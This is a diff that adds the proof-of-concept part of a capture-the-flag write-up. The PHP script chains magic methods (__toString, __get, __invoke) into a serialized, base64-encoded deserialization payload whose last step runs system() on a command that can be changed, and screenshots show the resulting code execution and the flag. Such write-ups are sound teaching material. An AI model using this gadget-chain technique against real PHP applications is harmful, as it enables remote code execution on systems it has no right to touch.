@@ -329,5 +329,84 @@ public function __destruct() {
 - Proof of concept-:
 
 ```php
+<?php
+class Note {
+    private $title;
+    private $content;
+    private $createdAt;
+    public $mystery;
+
+    public function __construct($title, $content) {
+        $this->title = $title;
+        $this->content = $content;
+        $this->createdAt = date("Y-m-d H:i:s");
+    }
+}
+class Call
+{
+    public $called;
+    public function __get($task)
+    {
+        ($this->called)();
+    }
+}
+class Hidden {
+    public $command;
+
+    public function __construct($command){
+        $this->command = $command;
+    }
+
+    public function __invoke() {
+        echo system($this->command);
+    }
+}
+class Work
+{
+    public $task;
+    public function __toString()
+    {
+        $this->task->action;
+    }
+}
+//Prepping up hidden
+$hidden =  new Hidden('id'); //Tweak me
+//Prepping up Call and passing hidden
+$call = new Call;
+$call->called =  $hidden;
+//Prepping up Work and passing call
+$work = new Work;
+$work->task = $call;
+//Prepping up notes and passing Work
+
+$notes = new Note("pwned","pwned");
+$notes->mystery = $work;
+
+$payload =  urlencode(base64_encode(serialize($notes)));
+echo $payload;
+?>
 ```
+
+![image](https://github.com/user-attachments/assets/2be22947-1c8d-46a7-b913-ff522ec71f47)
+
+- RCE achieved-:
+
+![image](https://github.com/user-attachments/assets/7b6ea0a4-3e3d-40e5-abab-f69b323ad766)
+
+- Reading the flag-:
+
+![image](https://github.com/user-attachments/assets/cbddbf8f-d452-456c-8c9e-896ac926c661)
+
+
+- Flag-: ```gdscCTF{750bbadee6e299d30c9784972a28f0cb}```
+
+![image](https://github.com/user-attachments/assets/597c0328-a92b-47f7-a558-c4a458479500)
+
+------------------
+
+### Thanks for Reading!!!
+
+-----------------
+
+
 
